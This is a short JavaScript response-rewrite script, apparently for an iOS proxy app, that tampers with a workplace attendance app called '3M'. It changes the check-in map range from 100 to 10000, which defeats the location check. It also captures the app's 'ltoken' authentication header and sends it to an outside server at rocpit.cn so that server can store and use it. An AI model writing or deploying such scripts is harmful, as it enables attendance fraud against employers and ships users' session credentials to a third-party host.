
console.log("3m_response脚本开始!");
var url = $request.url;
var headers = $request.headers;
var body = $response.body;
try {

    //改范围
    if (url.indexOf("/mapData") > -1) {

        console.log("url:" + url);

        body = body.replace("\"range\" : \"100\"", "\"range\" : \"10000\"");
        console.log("body:" + body);
    }

    //进签到功能时修改数据库token
    if (url.indexOf("/attendance/punchInfo") > -1) {

        console.log("url:" + url);

        console.log("header:" + JSON.stringify(headers));

        var token = headers["ltoken"];

        if (!!token) {
            $httpClient.get("http://www.rocpit.cn:8010/sys/company/savetoken3m?token=" + token, function (e, r, d) {
                console.log("错误:" + e);
                console.log("结果:" + d);
                if (d.indexOf("成功") > -1) {
                    $notification.post('3M Token修改成功!', '3M Token修改成功' + token, d);
                }
                else {
                    $notification.post('3M Token修改失败!', '3M Token修改失败:' + token, e);
                }
            });
        }
    }

} catch (e) {
    console.log("catch:" + e);
}

$done({body});
console.log("执行完成!!!!");
